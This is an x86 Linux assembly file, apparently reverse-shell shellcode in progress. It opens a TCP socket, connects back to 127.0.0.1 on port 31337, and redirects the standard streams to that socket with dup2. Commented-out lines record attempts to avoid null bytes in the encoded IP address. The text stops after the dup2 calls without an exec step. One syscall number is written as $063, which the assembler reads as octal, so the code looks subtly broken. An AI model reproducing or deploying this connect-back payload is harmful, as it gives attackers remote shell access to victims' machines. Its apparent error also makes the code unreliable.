# .intel_syntax noprefix
.text
.global _start
_start:

    # Use socketcall(int call, unsigned long *args) to call socket()
    # Resolve I/O redirection using stdin/stdout/stderr using dup2()

    # SOCK_STREAM = 1
    # AF_INET = 2

    # place call number into %eax
    xor %eax, %eax
    mov $102, %al

    # for socket() call (call number is 1 --> SYS_SOCKET)
    xor %ebx, %ebx
    mov $1, %bl

    # init args for socket(int domain, int type, int protocol)
    # domain = 2 (AF_INET) type=1 (SOCK_STREAM), protocol= 0
    xor %ecx, %ecx
    push %ecx
    add $1, %ecx
    push %ecx
    add $1, %ecx
    push %ecx
    mov %esp, %ecx

    xor %edx, %edx

    int $0x80

    # save socket
    mov %eax, %esi

    # init for connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
    # 127.0.0.1 => 0x0100007f


    xor %ecx, %ecx
    add $0x0100, %cx
    shl $16, %ecx
    add $0x7f, %cl 
    push %ecx

    # ty with $0x44434241 --> failed
    # xor %ecx, %ecx
    # add $0x4443, %cx
    # shl $16, %ecx
    # mov $0x4241, %cx # push %ecx

    # try with not --> failed
    # xor %ecx, %ecx
    # mov %ecx, 0xfeffff80             # ip address 127.0.0.1 "noted" to remove null
    # not %ecx # push %ecx


    # port = 31337
    pushw $0x697a

    # AF_INET = 2
    xor %ebx, %ebx
    mov $2, %bl
    push %bx

    mov %esp, %edi

    pushl $16
    push %edi
    push %esi
    xor %eax, %eax
    mov $102, %al
    xor %ebx, %ebx
    mov $3, %bl
    mov %esp, %ecx

    int $0x80

    # handle io with dup2(int oldfd, int newfd)
    # stdin: 0, stdout: 1, stderr: 2
    xor %eax, %eax
    mov $063, %al
    mov %esi, %ebx

    xor %ecx, %ecx
    int $0x80

    mov $63, %al
    add $1, %ecx
    int $0x80

    mov $63, %al
    add $1, %ecx
    int $0x80
